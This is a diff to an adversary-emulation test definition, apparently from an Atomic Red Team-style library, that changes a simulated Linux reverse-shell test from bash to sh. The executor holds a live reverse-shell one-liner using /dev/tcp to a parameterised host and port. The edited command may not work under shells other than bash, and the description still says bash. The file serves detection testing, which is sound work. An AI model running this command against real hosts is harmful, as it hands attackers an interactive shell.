@@ -252,7 +252,7 @@ atomic_tests:
   description: |
     Simulates a reverse shell connection attempt using bash and dev tcp.
     APT39 and other threat groups use this technique to establish interactive
-    remote shells on compromised Linux hosts. The test spawns bash with the
+    remote shells on compromised Linux hosts. The test spawns sh with the
     -i flag and redirects IO to dev tcp targeting a non-routable IP address.
   supported_platforms:
   - linux
@@ -267,8 +267,8 @@ atomic_tests:
       default: "4444"
   executor:
     command: |
-      timeout 5 bash -i >& /dev/tcp/#{target_host}/#{target_port} 0>&1 || true
+      timeout 5 sh -i >& /dev/tcp/#{target_host}/#{target_port} 0>&1 || true
     cleanup_command: |
       true
-    name: bash
+    name: sh
     elevation_required: false
